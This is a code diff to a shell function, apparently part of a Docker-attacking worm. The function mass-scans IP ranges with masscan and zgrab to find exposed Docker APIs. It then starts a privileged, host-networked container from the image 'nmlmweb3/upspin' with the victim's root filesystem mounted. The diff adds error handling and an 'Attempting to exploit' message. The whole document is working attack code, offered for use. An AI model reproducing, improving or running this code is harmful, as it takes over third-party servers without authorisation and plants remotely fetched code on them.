@@ -126,10 +126,26 @@ function AUTOLANDOCKERPWN() {
     PORT=$1
     RATE=$2
     RANGE=$3
-    ip_list=$(masscan -p$PORT $RANGE --rate=$RATE | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
+
+    echo "Scanning range: $RANGE on port: $PORT with rate: $RATE"
+
+    # Perform the scan
+    masscan_output=$(masscan -p$PORT $RANGE --rate=$RATE 2>&1)
+    if [[ $? -ne 0 ]]; then
+        echo "Error running masscan: $masscan_output"
+        return 1
+    fi
+
+    # Extract IPs and perform a zgrab scan
+    ip_list=$(echo "$masscan_output" | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
+    
+    if [[ -z "$ip_list" ]]; then
+        echo "No IP addresses found for port $PORT in range $RANGE"
+        return 1
+    fi
 
     for IPADDR in $ip_list; do
-        echo "$IPADDR:$PORT"
+        echo "Attempting to exploit $IPADDR:$PORT"
         timeout -s SIGKILL 240s docker -H tcp://$IPADDR:$PORT run -d --privileged --network host -v /:/host nmlmweb3/upspin:latest
     done
 }
